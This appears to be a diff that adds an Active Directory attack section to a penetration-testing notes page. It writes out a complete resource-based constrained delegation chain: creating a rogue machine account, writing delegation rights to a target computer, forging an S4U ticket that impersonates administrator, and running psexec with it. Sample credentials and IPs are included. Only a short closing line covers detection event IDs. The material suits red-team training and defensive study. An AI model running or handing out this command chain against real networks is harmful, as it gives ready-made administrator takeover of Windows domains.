@@ -33,3 +33,24 @@ sequenceDiagram
 
 ### Exhaustive commands
 ```bash
+# ── Create a machine account ─────────────────────────────────────────
+impacket-addcomputer -computer-name 'PWN$' -computer-pass 'Pwn123!' \
+  -dc-ip 10.10.10.5 corp.local/lowpriv:'Password123!'
+
+# ── Configure RBCD ──────────────────────────────────────────────────
+python3 rbcd.py -delegate-from 'PWN$' -delegate-to 'TARGET$' \
+  -action write -dc-ip 10.10.10.5 corp.local/lowpriv:'Password123!'
+
+# ── S4U chain ────────────────────────────────────────────────────────
+impacket-getST -spn 'cifs/target.corp.local' -impersonate administrator \
+  'corp.local/PWN$:Pwn123!'
+
+# ── Use the ticket ──────────────────────────────────────────────────
+export KRB5CCNAME=administrator@cifs_target.corp.local@CORP.LOCAL.ccache
+impacket-psexec -k -no-pass corp.local/administrator@target.corp.local
+```
+
+### Detection
+**5136** on computer objects for `msDS-AllowedToActOnBehalfOfOtherIdentity`; **4741** new machine accounts; **4769 S4U2Proxy** chains.
+
+---
